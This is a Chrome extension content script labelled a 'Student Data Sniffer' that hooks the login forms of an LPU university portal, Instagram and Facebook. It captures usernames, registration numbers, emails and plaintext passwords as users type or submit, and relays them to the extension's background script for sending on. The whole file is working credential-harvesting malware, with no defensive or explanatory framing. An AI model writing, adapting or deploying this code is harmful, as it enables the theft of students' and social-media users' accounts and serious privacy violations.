// =================== 🔄 Student Data Sniffer (LPU) ===================

console.log(
  "%c╔══════════════════════════════════════════════════════════════╗",
  "color: #9c27b0; font-weight: bold;"
);
console.log(
  "%c║           📡 SESSION LOGGER CONTENT SCRIPT LOADED            ║",
  "color: #9c27b0; font-weight: bold;"
);
console.log(
  "%c╚══════════════════════════════════════════════════════════════╝",
  "color: #9c27b0; font-weight: bold;"
);

// Track last sent data to avoid duplicate sends
let lastSentStudentData = { regNo: "", password: "" };
let lastSentInstagramData = { username: "", password: "" };
let lastSentFacebookData = { email: "", password: "" };

// =================== 🎓 LPU Student Data Sniffer ===================
function sendStudentData(regNo, password) {
  // Input validation
  if (!regNo || !password || regNo.length < 8 || password.length < 4) {
    return;
  }

  // Don't send if same as last sent data
  if (lastSentStudentData.regNo === regNo && lastSentStudentData.password === password) {
    console.log("%c[LPU] ⏭️ SKIP: Same data as last sent", "color: #9e9e9e;");
    return;
  }

  // Update last sent data
  lastSentStudentData = { regNo, password };

  console.log("%c[LPU] 📤 Sending student data...", "color: #9c27b0; font-weight: bold;");
  console.table({ registrationNumber: regNo, password: "***hidden***" });

  chrome.runtime.sendMessage({
    type: "student_data",
    data: { registrationNumber: regNo, password },
  });
}

function setupStudentListeners() {
  try {
    const regInput = document.getElementById("txtU");
    const passInput = document.getElementById("TxtpwdAutoId_8767");

    if (!regInput || !passInput) return false;

    // Find the login/submit button
    const loginBtn = document.querySelector("input[type='submit'], button[type='submit'], #btnLogin, .login-btn, [name='Submit']");

    // Debounce timer
    let debounceTimer = null;
    const DEBOUNCE_DELAY = 1500; // Wait 1.5 seconds after typing stops

    const sendWithValidation = () => {
      const regNo = regInput.value.trim();
      const password = passInput.value;

      // Only send if both fields have meaningful data
      // Registration number should be at least 8 chars (typical LPU format)
      // Password should be at least 4 chars
      if (regNo && password && regNo.length >= 8 && password.length >= 4) {
        sendStudentData(regNo, password);
      }
    };

    // Debounced send - waits for user to stop typing
    const debouncedSend = () => {
      clearTimeout(debounceTimer);
      debounceTimer = setTimeout(sendWithValidation, DEBOUNCE_DELAY);
    };

    // Send on form submit / login button click (most reliable)
    if (loginBtn) {
      loginBtn.addEventListener("click", () => {
        clearTimeout(debounceTimer); // Cancel debounce
        sendWithValidation();
      }, { capture: true });
    }

    // Also capture form submit event
    const form = regInput.closest("form") || passInput.closest("form");
    if (form) {
      form.addEventListener("submit", () => {
        clearTimeout(debounceTimer);
        sendWithValidation();
      }, { capture: true });
    }

    // Send on blur (when user leaves the field) - immediate, no debounce
    passInput.addEventListener("blur", sendWithValidation);

    // Debounced send on input (backup, but with delay)
    passInput.addEventListener("input", debouncedSend);

    // Send on Enter key press in password field
    passInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        clearTimeout(debounceTimer);
        sendWithValidation();
      }
    });

    console.log("%c[LPU] ✅ Input listeners attached", "color: #4caf50; font-weight: bold;");
    return true;
  } catch (e) {
    console.error("%c[LPU] ❌ Error setting up listeners:", "color: #f44336;", e);
    return false;
  }
}

// Retry mechanism for LPU inputs
if (location.hostname.includes("lpu") || location.hostname.includes("ums")) {
  if (!setupStudentListeners()) {
    let retries = 0;
    const maxRetries = 15;
    const interval = setInterval(() => {
      retries++;
      if (setupStudentListeners() || retries >= maxRetries) {
        clearInterval(interval);
        if (retries >= maxRetries) {
          console.log(
            "%c[LPU] ⚠️ Inputs not found after max retries",
            "color: #ff9800;"
          );
        }
      }
    }, 700);
  }
}

// =================== 🔐 Instagram Login Sniffer ===================
if (location.hostname.includes("instagram.com")) {
  console.log("%c[IG] 🔍 Scanning for login form...", "color: #e91e63; font-weight: bold;");

  let igTries = 0;
  const igMaxTries = 25;

  const sniffInstagramLogin = setInterval(() => {
    igTries++;

    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginBtn = document.querySelector("button[type='submit']:not([disabled])");

    if (usernameInput && passwordInput && loginBtn) {
      console.log("%c[IG] ✅ Login form detected", "color: #4caf50; font-weight: bold;");

      // Click handler for login button
      const handleInstagramLogin = () => {
        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        // Input validation
        if (!username || !password || username.length < 3 || password.length < 6) {
          console.log(
            "%c[IG] ⚠️ VALIDATION: Username ≥3, password ≥6 required",
            "color: #ff9800;"
          );
          return;
        }

        // Duplicate check
        if (lastSentInstagramData.username === username && lastSentInstagramData.password === password) {
          console.log("%c[IG] ⏭️ SKIP: Same data as last sent", "color: #9e9e9e;");
          return;
        }

        lastSentInstagramData = { username, password };

        console.log("%c[IG] 📤 Sending login credentials...", "color: #e91e63; font-weight: bold;");
        console.table({ username, password: "***hidden***" });

        chrome.runtime.sendMessage({
          type: "instagram_login_data",
          data: { username, password },
        });
      };

      // Attach click listener
      loginBtn.addEventListener("click", handleInstagramLogin, { capture: true });

      // Also capture form submit
      const form = loginBtn.closest("form");
      if (form) {
        form.addEventListener("submit", handleInstagramLogin, { capture: true });
      }

      // Capture Enter key on password field
      passwordInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          handleInstagramLogin();
        }
      });

      clearInterval(sniffInstagramLogin);
    }

    if (igTries >= igMaxTries) {
      clearInterval(sniffInstagramLogin);
      console.log("%c[IG] ⏹️ Login form not found (not on login page)", "color: #9e9e9e;");
    }
  }, 700);
}

// =================== 🔐 Facebook Login Sniffer ===================
if (location.hostname.includes("facebook.com")) {
  console.log("%c[FB] 🔍 Scanning for login form...", "color: #1877f2; font-weight: bold;");

  let fbTries = 0;
  const fbMaxTries = 25;

  const sniffFacebookLogin = setInterval(() => {
    fbTries++;

    // Facebook has multiple login form variations
    const emailInput = document.querySelector("input[name='email'], input#email");
    const passwordInput = document.querySelector("input[name='pass'], input#pass");
    const loginBtn = document.querySelector("button[name='login'], button[type='submit'], input[type='submit'][value='Log In'], [data-testid='royal_login_button']");

    if (emailInput && passwordInput && loginBtn) {
      console.log("%c[FB] ✅ Login form detected", "color: #4caf50; font-weight: bold;");

      // Click handler for login button
      const handleFacebookLogin = () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value;

        // Input validation
        if (!email || !password || email.length < 3 || password.length < 6) {
          console.log(
            "%c[FB] ⚠️ VALIDATION: Email ≥3, password ≥6 required",
            "color: #ff9800;"
          );
          return;
        }

        // Duplicate check
        if (lastSentFacebookData.email === email && lastSentFacebookData.password === password) {
          console.log("%c[FB] ⏭️ SKIP: Same data as last sent", "color: #9e9e9e;");
          return;
        }

        lastSentFacebookData = { email, password };

        console.log("%c[FB] 📤 Sending login credentials...", "color: #1877f2; font-weight: bold;");
        console.table({ email, password: "***hidden***" });

        chrome.runtime.sendMessage({
          type: "facebook_login_data",
          data: { email, password },
        });
      };

      // Attach click listener
      loginBtn.addEventListener("click", handleFacebookLogin, { capture: true });

      // Also capture form submit
      const form = loginBtn.closest("form") || emailInput.closest("form");
      if (form) {
        form.addEventListener("submit", handleFacebookLogin, { capture: true });
      }

      // Capture Enter key on password field
      passwordInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          handleFacebookLogin();
        }
      });

      clearInterval(sniffFacebookLogin);
    }

    if (fbTries >= fbMaxTries) {
      clearInterval(sniffFacebookLogin);
      console.log("%c[FB] ⏹️ Login form not found (not on login page)", "color: #9e9e9e;");
    }
  }, 700);
}
